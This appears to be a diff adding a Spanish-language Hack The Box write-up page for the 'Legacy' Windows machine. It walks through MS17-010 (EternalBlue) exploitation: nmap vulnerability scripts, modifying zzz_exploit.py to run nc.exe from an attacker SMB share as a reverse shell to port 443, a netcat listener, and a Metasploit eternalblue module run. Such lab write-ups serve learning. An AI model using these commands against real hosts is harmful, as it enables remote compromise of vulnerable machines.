@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Legacy HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/legacy/pasted-20251028145506.png" alt="Legacy HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Legacy</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>windows</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB antiguo vulnerable</li>
+            <li><code>Explotación</code>: MS17-010 / EternalBlue para obtener ejecución remota</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <h3>Comprobar vulnerabilidad Eternal Blue</h3>
+            <pre><code>nmap -p445 --script="SMB-vuln-*" legacy
+nmap --script SMB-vuln-ms17-010 -p445 legacy</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: [Eternal Blue Manual MS17-010](https://github.com/worawit/MS17-010.git)</h2>
+          <div class="code-card">
+            <h3>Comprobar PIPES vulnerables</h3>
+            <pre><code>python -m venv venv
+source venv/bin/activate 
+pip2 install setuptools==44.1.1
+pip2 install impacket==0.9.21
+
+python2 checker.py &lt;ip_victima&gt;
+# Observar pipes con Status Ok. Ej: browser: Ok (32 bits). Debe de haber al menos uno para explotarlo</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Editar zzz_exploit.py para inyectar comandos: Trataremos de ejecutar nc.exe con impacket desde Kali</h3>
+            <pre><code>nano zzz_exploit.py
+# Reemplazar payload de la línea 982 de la función def SMB_pwn(conn, arch):
+service_exec(conn, r'cmd /c &lt;comando&gt;')
+service_exec(conn, r'cmd /c \\&lt;kali_ip&gt;\&lt;SMBFolder_name&gt;\nc.exe -e cmd &lt;kali_ip&gt; 443')</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Kali: Ejecutar exploit</h3>
+            <pre><code># Compartir el recurso nc.exe con impacket
+cp &lt;ruta_nc.exe&gt; .
+impacket-smbserver SMBFolder $(pwd)
+# Listener
+rlwrap nc -nlvp 443
+# Exploit
+python zzz_exploit.py &lt;ip_victima&gt; &lt;pipe_name&gt;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>windows</span>
+          </div>
+        </section>
+          <div class="code-card">
+            <h3>Eternal Blue con Metasploit</h3>
+            <pre><code>msfconsole
+use exploit/windows/SMB/ms17_010_eternalblue 
+set RHOSTS blue 
+set LHOST 10.10.16.18 
+set LPORT 4444 
+exploit
+# Ejecutar varias veces y reiniciar msfconsole si falla</code></pre>
+          </div>
+      </article>
+    </main>
+  </body>
+</html>
